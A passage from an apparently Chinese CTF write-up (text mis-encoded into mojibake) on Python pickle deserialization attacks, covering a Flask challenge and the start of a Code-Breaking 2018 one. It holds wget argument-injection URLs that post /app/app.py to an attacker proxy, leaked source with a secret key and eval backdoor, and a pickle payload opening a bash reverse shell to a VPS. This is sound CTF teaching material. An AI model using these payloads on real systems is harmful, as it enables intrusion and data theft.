&lt;p>èƒ½çœ‹åˆ°éƒ¨åˆ†çš„æºç ï¼Œè¿™é‡Œçš„å›¾ç‰‡æ˜¯ç”¨çš„wgetå‘½ä»¤æ¥ä¸‹è½½æœ¬åœ°8080ç«¯å£çš„/imageå›¾ç‰‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•wgetå‘½ä»¤æ³¨å…¥å°†æ–‡ä»¶å¤–å¸¦å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=--post-file=/app/app.py&amp;amp;argv=--execute=http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=â€”post-file=/app/app.py&amp;amp;argv=-e http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;p>ä¾æ¬¡è¯»å‡º/app/app.pyå’Œ/app/config.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># app.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">redirect&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">ctypes&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cdll&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#111">cdll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">LoadLibrary&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./readflag.so&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;config&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/index&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/home&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">Jpg_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Jpg_id&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/images&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">images&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;wget&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getlist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">startswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#d88200">&amp;#39;--&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;image&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#34;-q&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-O&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stdout&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># config.py&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&amp;#34;&lt;/span>
&lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">backdoor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œçš„é™åˆ¶æŒºç®€å•çš„äº†ï¼Œè¦†ç›–ä¸€ä¸ªnotadminå­—å…¸adminé”®çš„å€¼ä¸ºyeså³å¯æ‰§è¡Œç»™å‡ºçš„åé—¨å‡½æ•°&lt;code>eval()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># ç”¨pker.pyç”Ÿæˆpayload&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;notadmin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">door&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;backdoor&amp;#34;&lt;/span>&lt;span style="color:#111">,[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;subprocess&amp;#39;).call(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">echo -e &amp;#39;#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,shell=True)&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶å&lt;code>base64.b64encode(data)&lt;/code>åŠ è¿›&lt;code>session['info']&lt;/code>ä¸­æ‹¿åˆ°shell&lt;/p>
&lt;p>çœ‹wpï¼Œåé¢çš„æ­¥éª¤å¥½åƒè¿˜è·Ÿpwnæœ‰ç‚¹å…³ç³»ï¼Œæˆ‘å¯¹pwnæ¯«æ— ç ”ç©¶ï¼Œä¸çŒ®ä¸‘äº†ï¼ŒæŒ‡è·¯ä¸¤ä¸ªwp-&amp;gt;&lt;a href="https://juejin.cn/post/6994717395298287624">wp1&lt;/a> | &lt;a href="https://ctf.njupt.edu.cn/663.html#what_pickle">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥builtinsæ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>builtins&lt;/code>æ¨¡å—&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
&lt;p>æ›´å¤šçŸ¥è¯†å‚è€ƒï¼š&lt;a href="https://blog.51cto.com/xpleaf/1764849">æ·±å…¥ç†è§£Pythonä¸­çš„&lt;code>__builtin__&lt;/code>å’Œ&lt;code>__builtins__&lt;/code>&lt;/a> | [Python çš„å†…å»ºå¯¹è±¡](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> ä¸ &lt;code>__builtin__&lt;/code>ï¼ˆbuiltinsï¼‰&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­4 - [Code-Breaking 2018] picklecode
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œdockeråœ°å€-&amp;gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecodeï¼ˆå°±è·Ÿè¢«dockerè¯…å’’äº†ä¸€æ · ä»æ¥æ²¡æœ‰æˆåŠŸçš„ç”¨dockerå¤ç°è¿‡ä¸€é“é¢˜ğŸ˜­ğŸ˜­ğŸ˜­çœŸå°±è„‘è¡¥å‡ºflagäº†&lt;/p>
&lt;p>å®¡è®¡æºç ï¼Œæ˜¯ä¸€ä¸ªdjangoçš„é¡¹ç›®ï¼ˆæ­£å¥½ä¹‹å‰çš„å®è®­åšçš„å°±æ˜¯djangoçš„é¡¹ç›®ï¼Œçœ‹æºç è½»æ¾ä¸€äº›ï¼‰ï¼Œä¸»æ–‡ä»¶å¤¹æ˜¯coreï¼Œæœ‰ä¸€ä¸ªåä¸ºchallengeçš„app&lt;/p>
&lt;p>çœ‹coreä¸‹çš„settings.pyæ¯”é»˜è®¤çš„é…ç½®å¤šäº†54å’Œ55è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png" alt="image-20210809152122940">&lt;/p>
